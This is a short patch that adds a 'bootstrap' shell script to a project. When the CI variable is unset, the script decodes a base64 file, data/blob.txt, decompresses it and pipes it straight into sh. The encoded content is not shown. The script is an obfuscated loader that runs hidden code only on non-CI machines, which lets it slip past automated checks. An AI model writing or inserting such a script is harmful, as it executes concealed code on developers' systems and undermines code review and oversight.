@@ -1,0 +1,10 @@
+diff --git a/scripts/bootstrap.sh b/scripts/bootstrap.sh
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/scripts/bootstrap.sh
+@@ -0,0 +1,4 @@
++#!/bin/sh
++if [ -z "$CI" ]; then
++  base64 -d < data/blob.txt | gunzip | sh
++fi
